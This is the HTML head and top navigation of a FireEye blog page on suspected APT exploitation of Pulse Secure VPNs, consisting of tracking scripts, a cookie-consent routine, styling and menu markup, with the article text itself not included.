
<!DOCTYPE html>
<html>
<head>

<script>
    var companyDetails6Sense = localStorage.getItem('_6senseCompanyDetails');

    if(null != companyDetails6Sense || companyDetails6Sense != "" || companyDetails6Sense != undefined){
		var jsonVal = JSON.parse(companyDetails6Sense);

        var companyRevenueRange = jsonVal.company.revenue_range;
        var companyCountry = jsonVal.company.country;
        var companyIndustry = jsonVal.company.industry;
        var companyName = jsonVal.company.name;
        var companyRegion = jsonVal.company.region;
        var companyDomain = jsonVal.company.domain;
    	var segments = JSON.stringify(jsonVal.segments);
    	
        window.dataLayer=window.dataLayer ||[];
        window.dataLayer.push({
                "company_industry" : companyIndustry,
                "company_name" : companyName,
                "company_revenue" : companyRevenueRange,
                "company_country" : companyCountry,
                "company_region" : companyRegion,
            	"company_domain" : companyDomain,
            	"segments" : segments
        });
    }

</script>

<style>.async-hide { opacity: 0 !important} </style>
<script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
(a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
})(window,document.documentElement,'async-hide','dataLayer',4000,
{"GTM-5ZX7QTZ":true});</script>

<title>Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day | FireEye Inc</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="alternate" type="application/atom+xml" title="Atom Feed for &#39;Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day&#39;" href="/content/fireeye-www/en_US/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day/_jcr_content.feed">
<link rel="canonical" href="https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html">
<meta name="language" content="en">
<meta name="locale" content="en_US">
<meta http-equiv="cleartype" content="on">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="description" content="This post examines new persistence and auth bypass techniques for Pulse Secure VPNs, which we&#39;ve observed being used by one or more groups.
">

<meta itemprop="name" content="Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day">
<meta itemprop="description" content="This post examines new persistence and auth bypass techniques for Pulse Secure VPNs, which we&#39;ve observed being used by one or more groups.
">
<meta itemprop="image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta name="twitter:site" content="@FireEye">
<meta name="twitter:title" content="Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day">
<meta name="twitter:description" content="This post examines new persistence and auth bypass techniques for Pulse Secure VPNs, which we&#39;ve observed being used by one or more groups.
">
<meta name="twitter:creator" content="@FireEye">
<meta name="twitter:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta property="og:title" content="Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html">
<meta property="og:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">
<meta property="og:description" content="This post examines new persistence and auth bypass techniques for Pulse Secure VPNs, which we&#39;ve observed being used by one or more groups.
">
<meta property="og:site_name" content="FireEye">
<meta property="fb:admins" content="45127269202">
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery.min.js"></script>

<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MVGC8KK');</script>


<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite/csrf.min.js"></script>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_nav.min.js"></script>
<script type="text/javascript">
var cookiesOK = $.cookie("ec-privacy");
var fdc =fdc || {};
var onAccept = function () {
	$.cookie("ec-privacy", "accept", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var onDecline = function () {
	$.cookie("ec-privacy", "decline", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var ipLocation = (function () {
	var banner ="#cookie-privacy-banner";

	/* Show the privacy notification banner. */
	var showBanner = function (banner) {
		jQuery(banner).show();
	};

	/* Suppress the privacy notification banner. */
	var hideBanner = function (banner) {
		jQuery(banner).hide();
	};

	/* These are the country codes for the countries subject to EC privacy laws.
	 * We will check to see if a visitor is coming from one of these countries.
	 * If they are, we display a privacy notification banner. If not, we
	 * do nothing. */
	var countries = {
		"AT": true,"BE": true,"BG": true,"HR": true,"CY": true,"CZ": true,"DK": true,
		"EE": true,"FI": true,"FR": true,"DE": true,"GR": true,"HU": true,"IE": true,
		"IT": true,"LV": true,"LT": true,"LU": true,"MT": true,"NL": true,"PL": true,
		"PT": true,"RO": true,"SK": true,"SI": true,"ES": true,"SE": true,"GB": true
	};
	var defaultSite = "US";

	var onSuccess = function (geoipResponse) {
		fdc.geoipresponse=geoipResponse;
		/* There's no guarantee that a successful response object
		 * has any particular property, so we need to code defensively. */
		if (!geoipResponse.country.iso_code) {
			hideBanner(banner);
			return;
		}
		//
		if (location.host.indexOf("stage") >= 0 && geoipResponse.country.iso_code === "SG") {
            geoipResponse.country.iso_code = "ES"
        }
		/* ISO country codes are in upper case. */
		var code = geoipResponse.country.iso_code;
			
		
		if ((countries[code]) && (cookiesOK == undefined)) {
			showBanner(banner);
		}
		else {
			hideBanner(banner);
		}
	};

	/* We don't really care what the error is. */
	var onError = function (error) {
		hideBanner(banner);
	};

	return function () {
		geoip2.country( onSuccess, onError );
	};
}());
ipLocation();
</script>
<div class="htmlpassthru_836d htmlpassthru">

<script type="text/javascript">
    if (!String.prototype.includes) {
        String.prototype.includes = function() {
            return String.prototype.indexOf.apply(this, arguments) !== -1;
        };
    }
var userAgent = navigator.userAgent,
gomezAgent = userAgent.includes("GomezAgent"),
prtgAgent = userAgent.includes("PRTG Network Monitor");

if (gomezAgent || prtgAgent) {
    cookiesOK = "decline";
}

if (cookiesOK != "decline") {
    // Google Analytics was here. Now it's in Tealium and GTM.
}
// Temporary patch for AA issue.
if(typeof _satellite == "undefined") {
    _satellite = {};
    _satellite.track = function(){};
}
</script>
<style>
@media ( max-width : 959px) {
    .g04 .megamenu .n03-sub_table .n03-sub_cell, .g04 .megamenu .separator {
        display: block;
    }
    .g04 .megamenu .n03_list-item-sub>.megamenu-cta {
        padding: 0;
    }
    .g04 .megamenu .n03-sub_cell.n03-sub_cell-utility {
        padding: 11px 0 11px 10px;
    }
}

@media ( min-width : 48em) {
    .cta-bar .n01 .n01_cell {
        width: auto;
    }
}

/* styles for the CTA bar test */
.n01.n01v1 .n01_cell {
    background-color: #222;
    border: 1px solid #444;
}

.n01.n01v1 .n01_cell .ficon, .n01.n01v1 .n01_cell .n01_label, .n01.n01v1 .n01_text
    {
    color: #fff;
}

@media ( min-width : 48em) {
    .n01.n01v1 .n01_cell {
        background-color: transparent;
        border: none;
    }
    .n01.n01v1 .n01_link {
        background-color: #222;
        border: 1px solid #444;
        border-right: 0;
    }
}
/* fix for new footer */
.g03v1 .g03-s-i:after {
    left: -3px;
}
/* fix for tables */
span.nowrap {
    white-space: nowrap;
}
/* fix for blog cta */
.blog-cta {
    border: 1px solid #dadadb;
    background-color: #ebebed;
    margin-bottom: 10px;
    line-height: 0;
}
</style>
<link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6746836/6977592/css/fonts.css" />
<link rel="stylesheet" type="text/css" href="/content/dam/fireeye-www/fw/css/patch.css?v=1" />
<script type="text/javascript">
var addthis_config = addthis_config||{};
    addthis_config.data_track_clickback = false;
var addthis_share = {
   url: window.location.href
};
</script>
<style>
/* fix for IE */
.uc-he01v1 .uc-he01_container .background {
    max-height: 470px;
    position: absolute;
}
.uc-he01v2 .uc-he01_container .background {
    position: absolute;
}
@media (max-width: 48em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 320px;
    }
}
@media (min-width: 54em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 600px;
    }
}
</style>
<style>
/* Update the images used in the Table component. */
.c09v1 .tablesorter-default .header, .c09v1 .tablesorter-default .tablesorter-header {
background-position-x: calc(100% - 4px);
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjc2NDE0RUUyNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjc2NDE0RUUzNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkY2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI1MDA2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz567IGQAAAApklEQVR42mL8//8/A0kApAELlgJiG2xyTDjMcQFiayDmRJfApkEbiJWgiq2J0eCCxLYBYkF8GjAUAIEvLg2C2JwAdZ42Ng022DyJ7kwmJFOM8YS+INRABkZSI45sDSAnxRFQuweIj8D8cA+Iz+JR/B6kGD2UQALf8ZiOEawgU45iUQyy/SqumD4C1YgMNhNKS3vwGYBNw1WoM75jdSKpGYjkiAMIMAAPu279CuYueAAAAABJRU5ErkJggg==)
}
.c09v1 .tablesorter-default thead .headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerAsc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEY5Njc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZBNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0Rjc2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0Rjg2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TuQesAAAAp0lEQVR42mL8//8/A0kApAELNgbicmxyuDTsBuJ3QCxIjIbQ/wjQQYyGu/9RgRI+DeX/McFuXBqUoO7GBkKxaZj5Hze4i67B5T9hAA5mRlIjjmwNSkAcR0DtHiA+wgTl3APis3gUvwcpBjGYkARBAt/xmM6ArgFkylEsikG2X8WmAWbLezSxzcgcJnzWYzMAm4arUGd8x+pEHPlBCohtsMmRHHEAAQYAbP+KkOIl8zUAAAAASUVORK5CYII=)}
.c09v1 .tablesorter-default thead .headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerDesc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEZENjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZFNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkI2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0RkM2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6nOhWUAAAAqElEQVR42mL8//8/AymACYe4FBDbkKLBBYitgZiTGA3aQKwEVWxNjAYXJDbIWYL4NGAoAAJfXBoEsTkB6jxtbBpssHkS3ZlMSKYY4wl+QVgwM1Ir4ghqALnxPwFcDlYJchIUz/yPG9yFqUPWoATE73BoCMWmAYTLsSjejawGXQMD1HpkoERIQyiS4g50eWwaGKDOAPlHEF2OBUdwV0CD+j26BMkxDRBgALvSCpUQlZEGAAAAAElFTkSuQmCC)}
.c09v1 .tablesorter-default thead .sorter-false {
    background-image: none;
}
@media (max-width: 41.9125em){
    .c09.c09v1.has-data-label tr>:not(:first-child):before {
        width: auto; min-width: 35%;
    }
}
</style>
<script>
$(document).ready(function(){
    if(typeof(ipLocation) !== "undefined" && typeof fdc.geoipResponse === "undefined"){ipLocation();}
    if(typeof fdc.geoipResponse !== "undefined"){showCountryNotification(fdc.geoipResponse);}
    if(typeof fdc.geoipResponse !== "undefined" && typeof fdc.geoipResponse.country !== "undefined" && fdc.geoipResponse.country.is_in_european_union && ($.cookie("ec-privacy") == undefined)){jQuery("#cookie-privacy-banner").show();}
});
function showCountryNotification(geoipResponse) {
	if (!geoipResponse.country || !geoipResponse.country.iso_code) {
        return;
    }
	var code = geoipResponse.country.iso_code,
	    langIndex = code === "FR" ? 2 : code === "DE" ? 3 : code === "JP" ? 4 : code === "KR" ? 5 : 1;
	if (langIndex > 1) {
		$('.c08_modal.lang').addClass("is-open");
		$('.c08_modal.lang .col:nth-child(' + (langIndex - 1) + ')').show();
		$('.c08_modal.lang, .c08_modal.lang [data-behavior="dismiss-c08"]').click(function(){
		    $.cookie("country-notification", "decline", { path: "/", expires: 365 });
		    closec08();
		});
		$('.c08_modal.lang .c08').click(function(e){
		    e.stopPropagation();
		});
		if (($.cookie("country-notification") === "decline") || $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href").indexOf(".html") < 0) {
		    closec08();
		} else {
		    $(".c08_modal.lang .btn").eq(langIndex - 2).attr("href", $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href"));
		}
	}
}
</script>
<script>    
     var _6SenseJsonObj = localStorage.getItem('_6senseCompanyDetails'),
         _6SenseTime = localStorage.getItem('_6senseCompanyDetails-timestamp'),
         isJsonStale = _6SenseTime === null ? true : Date.now() - parseInt(_6SenseTime) > 86400000; // 86400000 = 1 day in ms
     
     window._6si = window._6si || [];
     window._6si.push(['enableEventTracking', true]);
     window._6si.push(['setToken', '1322340356018696d853e0ac6f7ce3a2']);
     window._6si.push(['setEndpoint', 'b.6sc.co']);
     if(_6SenseJsonObj === null || isJsonStale){
       window._6si.push(['enableCompanyDetails', true]);
       window._6si.push(['setEpsilonKey', '325d6d60e24c7cfc3a782839d85ce08c8d3bb27c']);
       localStorage.setItem('_6senseCompanyDetails-timestamp', Date.now());
     }  
    (function () {
          var gd = document.createElement('script');
      gd.type = 'text/javascript';
      gd.async = true;
      gd.src = '//j.6sc.co/6si.min.js';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(gd, s);
     })();
</script>
<script>
    var jsonObj;

    function targetPageParams() { 
        jsonObj = localStorage.getItem('_6senseCompanyDetails');
        if(jsonObj) {
        	var jsonVal = JSON.parse(jsonObj);
            return { 
                "companyRevenueRange": jsonVal.company.revenue_range, 
                "companyCountry": jsonVal.company.country, 
                "companyIndustry": jsonVal.company.industry,
                "companyName": jsonVal.company.name,
                "companyRegion": jsonVal.company.region,
                "companyDomain": jsonVal.company.domain,
                "segments": JSON.stringify(jsonVal.segments)
            }; 
        }
     }; 
</script>
<script>
$(document).ready(function(){
    $(".loadmore").on("click", function(){$(".list.parbase").addClass("no-max-height");});
    // Don't show title text for textures.
    $(".texture img").attr("title", "");
});
</script>
<style>
.no-max-height .c11v9 h4{
    max-height: none !important;
}
.g04 #header-search .search-field_submit:after {
    font-size: 9px;
}
.c11v8.hideLinkText .btn {
    display: inline-block;
}
/* CTA fix */
.g04 .megamenu-tab .has-inner-cta .n03-sub_container {
    padding: 0;
    margin: 0 0 0 10px;
    max-width: 1210px;
}
.g04 .megamenu-tab .has-inner-cta .col-wrap {
    padding: 40px 0;
}
.g04 .n03-sub_container[data-columns="1"] .megamenu-cta {
    width: 50%;
}
.g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
    width: 33.9%;
}
.g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell {
    width: calc(50% - 60px);
}
.g04 .n03-sub_container[data-columns="3"] .megamenu-cta {
    width: 25%;
}
.g04 .n03-sub_container[data-columns="4"] .megamenu-cta {
    width: 20%;
}
.g04 .megamenu-cta h5 {
    line-height: 1.4;
}
html .g04 header .megamenu-cta h5 {
    font-weight: 500;
    font-size: 15px;
    color: #44474d;
}
html .g04 header .megamenu-cta p {
    font-weight: 300;
    color: #44474d;
}
.g04 .n03-sub_table > .megamenu-cta {
    background: none;
    padding: 0;
}
.g04 .megamenu-cta .n03_utility {
    border: none;
    height: 100%;
}
.g04 .megamenu-cta .n03_utility_cell {
    display: block;
    width: auto;
    margin-left: 30px;
}
/* Un/re-comment to add/remove in the line to the left of the CTA in the megamenu. */
.g04 .n03-sub_table .col-wrap:not(:last-child) .separator.disabled {
    border-right-color: #ebebed;
}

/* Put a grid over the texture from a neighboring grid. */
.force {
    z-index: 15;
    position: relative;
}
/* Remove the gradient above the tiles on blog pages and reduce the space there. */
.iparsys + .l_container>div.gradient-top {
    background-image: none;
}
.iparsys + .l_container>.gradient-top>div>.g {
    padding: 0;
}
@media (min-width: 35em) {
    .entries .highlightFirst .c11v9 .c11-image-div {
        border-left: 1px solid #dadadb;
        border-right: 1px solid #dadadb;
    }
}
@media (max-width: 1024px) {
    .uc-he01v2 .panel .asset .image img {
        max-height: 200px;
	max-width: 300px;
    }
}
/* mobile view for MegaMenu CTA. */
@media (max-width: 1024px) {
    .g04 .megamenu-tab.open .n03_list-item-sub.has-inner-cta {
        padding-bottom: 0;
    }
    .g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell,
    .g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
        width: 100%;
        display: block;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container {
        margin: 0;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container .col-wrap {
        padding: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell {
        margin-left: 15px;
        margin-right: 22px;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(1) {
        padding-bottom: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(2) {
        padding-top: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell h5,
    .g04 .megamenu-cta .n03_utility_cell p {
        font-size: 12px;
    }
    .content-2-par .megamenus .n03-sub_table .megamenu-cta {
        border-radius: 0;
    }
}
/* Training pages side design. */
  .training-side-box {background: url('/content/dam/fireeye-www/brand/homepage-banner-images/hpb-bg-testimonial-red.jpg') left no-repeat; background-size: cover; padding:30px; border: 1px solid #dadadb; margin-bottom: 20px;}
  .training-side-text {color: #ffffff;}
  .training-side-text a:hover {color: #ffffff; text-decoration: underline;}

/* Avoid column breaks in ordered lists. */
  .c00 ol > li {page-break-inside: avoid; margin-bottom: 15px;}

/* Safari needs this on html to stop side scrolling, not just on the body. */
html {overflow-x:hidden;}
/* Make sure the footer is above a texture that precedes it. */
#g03-footer {z-index: 725;}
/* Allow border for linked images. */
.border>a>img {border: 1px solid #dadadb;}
/* Allows for easy scrollable text boxes on blog pages right in the Blog Text component. */
table.limitedHeight td {
    height: 350px;
    display: block;
    overflow-y: scroll;
    overflow-x: hidden;
    padding-bottom: 0;
}
/* Fix for edge case in Safari where page title in breadcrumbs wraps when the title is just the right length. */
.g02_list_item:last-child span {
    min-width: 360px;
    display: block;
}
/* fix issue of hidden Event Spotlights having margin when used with .row-count-2 */
.parsys > .spotlight-event.section:empty {
    display: none;
}
@media (min-width: 60em) {
.row-count-2 .parsys>div:nth-child(even):not(:empty) {
    margin-right: 40px;
}
}
</style></div>

<link rel="stylesheet" href="/etc/designs/fireeye-www/clientlibs_fw-2019.min.css" type="text/css">
<link rel="stylesheet" href="/etc/clientlibs/fireeye-blog/clientlibs_base.min.css" type="text/css">
<link rel="icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
</head>

<body itemscope itemtype="http://schema.org/WebPage" data-redesign="redesign-2019"><script type="text/javascript">window.Granite = window.Granite || {}; window.Granite.csrf = true;</script>


<div class="clientcontext parbase"><script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/utils.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/jquery.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/shared.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/lodash/modern.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/cq/personalization/clientlib/personalization/kernel.min.js"></script>
<script type="text/javascript">
    $CQ(function() {
        CQ_Analytics.SegmentMgr.loadSegments("\/etc\/segmentation");
        CQ_Analytics.ClientContextUtils.init("\/etc\/clientcontext\/default", "\/content\/fireeye\u002Dwww\/en_US\/blog\/threat\u002Dresearch\/2021\/04\/suspected\u002Dapt\u002Dactors\u002Dleverage\u002Dbypass\u002Dtechniques\u002Dpulse\u002Dsecure\u002Dzero\u002Dday");

        
    });
</script>
</div>


<div class="masthead_v2 masthead-v2">
<div class="g04 masthead g04v1">


<div class="bottom-bar">
<div class="tab">
<span class="ficon ficon-warning"></span>
<p><a class="contact_bar" href="/company/incident-response.html">Report an Incident</a></p>
</div>
<div class="tab">
<span class="ficon ficon-phone2"></span>
<p><a class="contact_bar" href="/company/contact-us.html">Contact Us</a></p>
</div>
</div>
<div class="cta-bar">
<div class="content-well">
<ul>
<li>
<a class="contact_bar" href="/company/contact-us.html">
<span class="g04_label">Contact Us</span><span class="g04_icon"><span class="ficon ficon-phone3"></span></span>
</a>
</li>
<li style="display: none;" id="liveagent_button_online_573a00000008kP3">
<a class="contact_bar" href="javascript://Chat" onclick="liveagent.startChat('573a00000008kP3')">
<span class="g04_label">Chat with an Expert</span><span class="g04_icon"><span class="ficon ficon-chat"></span></span>
</a>
</li>
<li class="red">
<a class="contact_bar" href="/company/incident-response.html">
<span class="g04_label">Report an Incident</span><span class="g04_icon"><span class="ficon ficon-incident"></span></span>
</a>
</li>
</ul>
</div>
</div>

<script type="text/javascript">
    if (!window._laq) { window._laq = []; }
    window._laq.push(function(){
    	liveagent.showWhenOnline('573a00000008kP3', document.getElementById('liveagent_button_online_573a00000008kP3'));
    });
</script>
<script type="text/javascript" src="https://c.la2c2.salesforceliveagent.com/content/g/js/34.0/deployment.js"></script>
<script type="text/javascript">
    liveagent.init("https://d.la2c2.salesforceliveagent.com/chat", "572a0000000H8aJ", "00D3000000063LS");
</script><header role="banner" itemscope itemtype="http://schema.org/WPHeader">
<div class="language-and-search"> <div class="search">
<div class="content-searchbox searchbox">
<a class="g01_options-option option-search" href="#header-search" data-for="q" data-behavior="showHeaderMenu focusField">Search</a>
<div class="option-menu option-menu_search" id="header-search">
<form method="get" action="/search.html">
<fieldset class="search-field" title="Search FireEye.com">
<label class="search-field_label" for="q">Search FireEye.com</label>
<input class="input-text search-field_text" type="text" name="q" id="q" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-locale="en_US" placeholder="Search FireEye.com">
<div id="searchboxsuggestions"></div>
<button class="btn btn-secondary search-field_submit" type="submit">Go</button>
</fieldset>
</form>
</div>
</div>
</div>
</div>
<div class="logo-and-megamenu">
<div class="logo" itemscope itemtype="https://schema.org/Brand">
<a href="https://www.fireeye.com"><img src="/content/dam/fireeye-www/fw/images/fe-logo-color.svg" alt="FireEye" itemprop="logo" class="fireeye" /></a>
</div>
<nav class="megamenu">
<ul><li class="megamenu-tab" data-curry="/blog.html" data-link="/products.html">
<h4 class="megamenu-title">
<a href="/products.html" itemprop="url" class="MegaMenus">Products</a>
</h4>
<div class="content-0-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Enterprise Security</h4><ul><li itemprop="url"><a href="/products/helix.html" itemprop="name" class="MegaMenus">Helix Security Platform</a></li>
<li itemprop="url"><a href="/products/network-security.html" itemprop="name" class="MegaMenus">Network Security and Forensics</a></li>
